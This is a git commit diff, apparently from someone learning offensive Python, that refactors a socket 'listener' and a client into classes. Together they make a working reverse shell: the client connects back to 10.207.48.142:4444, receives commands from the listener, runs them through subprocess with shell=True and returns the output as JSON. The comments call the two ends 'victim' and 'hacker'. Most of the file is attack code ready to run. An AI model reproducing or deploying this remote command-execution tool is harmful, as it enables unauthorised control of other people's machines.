92673ab5f82b57892f3c1ede0f617f8a38a28b3b
mallik <mallikarjunasai995@gmail.com>
2022-04-11 05:17:11 +0530

    socketOOPS

--- SocketPython/listener.py
+++ SocketPython/listener.py
@@ -1,22 +1,50 @@
-import socket
+import socket,json
+from unittest import result
 
-listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-#basically using the same address when is there is a disconnection between victim and listener
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("10.207.48.142",4444))
-listener.listen(0)
-print("waiting for connections")
-#accept return two objects 1. connection - socket object to send and receive data 
-#2. address that is responsible for communication
+class Listener:
+    def __init__(self,host,port):
+        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        #basically using the same address when is there is a disconnection between victim and listener
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((host,port))
+        listener.listen(0)
+        print("waiting for connections")
+        #accept return two objects 1. connection - socket object to send and receive data 
+        #2. address that is responsible for communication
+        self.connection , address = listener.accept()
+        print(" [+] connection from " + str(address))
+        print(' Connection Established')
+    def reliable_send(self,data):
+        json_data = json.dumps(data)
+        json_data = json_data.encode()
+        self.connection.send(json_data)
+    def reliable_receive(self):
+        #data will receive at bytes and cound't able to transfer all data at once
+        # so while loop is requried to make sure all data is received and print other than
+        #the buffer size which we always give
+        json_data = b''
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
-connection , address = listener.accept()
-print(" [+] connection from " + str(address))
-print(' Connection Established')
+    def execute_remotely(self,command):
+         print('in execute remotely funciton')
+         result1 = self.reliable_send(command)
+         result2 = self.reliable_receive()
+         print(type(result2),result2)
+        #  return result1
+         return result2
+    def run(self):
+     while True:
+        command = input(' >>>> enter input ')
+        # command = command.encode()
+        result = self.execute_remotely(command)
+        # result = result.decode()
+        print(result)
 
-while True:
-    command = input('enter input')
-    connection.send(command)
-    result = connection.recv(1024)
-
-# connection.close()
-    
+listen = Listener("10.207.48.142", 4444)
+listen.run()
+       
--- SocketPython/socket_basics.py
+++ SocketPython/socket_basics.py
@@ -2,6 +2,7 @@ import socket
 import os
 import pathlib
 import subprocess
+import json
 
 #subprocess allows you to execute system commands/other programs from python
 #subprocess.call('ipconfig',shell=True)
@@ -10,23 +11,46 @@ import subprocess
 #some of them will finish executing then only other will execute - call - foreground
 # https://stackoverflow.com/questions/7681715/whats-the-difference-between-subprocess-popen-and-call-how-can-i-use-them#:~:text=Popen%20is%20more%20general%20than,Popen%20returns%20a%20Popen%20object.
 
+class SockClient:
+    def __init__(self,host,port):
+        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.connection.connect((host,port))
+        print("hi am here")
 
-def command_execute_result(command):
-    return subprocess.check_output(command,shell=True)
+    def command_execute_result(self,command):
+        return subprocess.check_output(command,shell=True)
+    def reliable_send(self,data):
+        data = data.decode()
+        json_data = json.dumps(data)
 
+        json_data = json_data.encode()
+        self.connection.send(json_data)
+    def reliable_receive(self):
+        #data will receive at bytes and cound't able to transfer all data at once
+        # so while loop is requried to make sure all data is received and print other than
+        #the buffer size which we always give
+        json_data = b''
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
-connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-connection.connect(("10.207.48.142",4444))
-print("hi am here")
-# connection.send(b"connecting estalished")
-while True:
+    def run(self):
+        # connection.send(b"connecting estalished")
+        while True:
+            command = self.reliable_receive()
+            # command = command.decode()
+            command_result = self.command_execute_result(command)
+            print(type(command_result))
+            # connection.send(command_result)
+            self.reliable_send(command_result)
+            # print(command_result.decode())
+        connection.close()
 
-    command = connection.recv(1024)
-    command = command.decode()
-    command_result = command_execute_result(command)
-
-print(command_result.decode())
-connection.close()
 
 
 #adding our own listener btn victim and hacker - check next file
+client1 = SockClient("10.207.48.142",4444)
+client1.run()
